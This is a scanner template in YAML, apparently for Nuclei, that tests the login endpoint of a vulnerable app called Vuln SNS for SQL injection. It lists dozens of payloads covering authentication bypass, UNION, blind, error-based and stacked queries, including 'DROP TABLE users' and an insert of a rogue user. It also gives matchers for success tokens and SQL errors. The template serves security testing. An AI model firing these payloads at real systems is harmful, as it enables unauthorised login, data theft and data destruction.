id: vuln-sns-login-sql-injection
info:
  name: Vuln SNS Login - SQL Injection
  author: claude
  severity: critical
  description: |
    Tests for SQL injection vulnerabilities in the login endpoint.
    Successful exploitation could lead to authentication bypass,
    data extraction, or database manipulation.
  reference:
    - https://owasp.org/www-community/attacks/SQL_Injection
  tags: vuln-sns,sqli,login,critical

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/login"

    headers:
      Content-Type: application/json

    body: |
      {"user_id":"{{injection}}","password":"test123"}

    payloads:
      injection:
        # Authentication bypass
        - "' OR '1'='1"
        - "' OR '1'='1' --"
        - "' OR '1'='1' #"
        - "' OR 1=1 --"
        - "' OR 1=1 #"
        - "admin' --"
        - "admin' #"
        - "') OR ('1'='1"
        - "') OR ('1'='1' --"
        - "' OR '1'='1' /*"
        - "' OR 'a'='a"
        - "' OR ''='"
        - "'/**/OR/**/1=1"
        # Union-based
        - "' UNION SELECT null,null,null --"
        - "' UNION SELECT 1,2,3 --"
        - "' UNION SELECT @@version,null,null --"
        - "' UNION ALL SELECT null,null,null --"
        # Time-based blind
        - "' AND SLEEP(5) --"
        - "' OR SLEEP(5) --"
        - "' AND BENCHMARK(5000000,MD5('test')) --"
        - "' OR IF(1=1, SLEEP(5), 0) --"
        # Boolean-based blind
        - "' AND '1'='1"
        - "' AND '1'='2"
        - "alice' AND '1'='1"
        - "alice' AND '1'='2"
        - "' AND LENGTH(database())>0 --"
        # Error-based
        - "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
        - "' AND extractvalue(1,concat(0x7e,@@version)) --"
        - "' AND updatexml(1,concat(0x7e,@@version),1) --"
        # Stacked queries
        - "'; DROP TABLE users; --"
        - "'; INSERT INTO users VALUES (99,'hacker','password'); --"
        # Information gathering
        - "' OR EXISTS(SELECT * FROM users) --"
        - "' OR EXISTS(SELECT * FROM information_schema.tables) --"
        # Double quotes
        - "\" OR \"1\"=\"1"
        - "\" OR \"1\"=\"1\" --"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - '"token":'
          - '"user":'
        condition: and
        part: body

      - type: word
        words:
          - "You have an error in your SQL syntax"
          - "MySQLSyntaxErrorException"
          - "Column count doesn't match"
          - "Unknown column"
          - "Table.*doesn't exist"
          - "Error 1064"
          - "Error 1045"
          - "Error 1105"
          - "SQLSTATE[42000]"
          - "SQLSTATE[HY000]"
        condition: or
        part: body

      - type: dsl
        dsl:
          - 'duration>=5'
        condition: and

      - type: status
        status:
          - 500

    extractors:
      - type: regex
        name: sql_error
        regex:
          - 'SQL.*error.*'
          - 'mysql.*error.*'
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/api/login"

    headers:
      Content-Type: application/json

    body: |
      {"user_id":"test","password":"{{injection}}"}

    payloads:
      injection:
        - "' OR '1'='1"
        - "' OR '1'='1' --"
        - "password' OR '1'='1"
        - "' UNION SELECT null --"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - '"token":'
          - '"user":'
        condition: and
        part: body

      - type: word
        words:
          - "SQL syntax"
          - "mysql error"
        condition: or
        part: body
